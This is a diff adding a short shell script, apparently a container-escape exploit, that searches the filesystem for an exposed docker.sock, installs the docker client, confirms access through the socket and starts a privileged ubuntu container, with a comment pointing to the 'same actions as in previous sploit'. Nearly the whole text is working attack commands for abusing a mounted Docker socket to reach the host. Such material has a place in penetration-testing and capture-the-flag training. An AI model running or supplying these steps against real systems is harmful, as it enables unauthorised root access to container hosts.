@@ -1,0 +1,29 @@
+# lets find docker.sock in system
+# it may be mounted not in /var/run/docker.sock
+
+find / -name docker.sock
+# -> /root/docker.sock
+
+# name may be changed, find allow us to find all sockets in system
+# find / -type s
+
+# install docker to machine
+# apk add docker
+# OR
+# apt install docker.io
+# OR
+# curl -L get.docker.com
+# OR
+# ...
+
+apk add docker
+
+# check that docker works with provided socket
+docker --host unix:///root/docker.sock ps
+
+
+# run privileged container
+docker --host unix:///root/docker.sock container run --privileged -it ubuntu
+
+# same actions as in previous sploit
+# ....
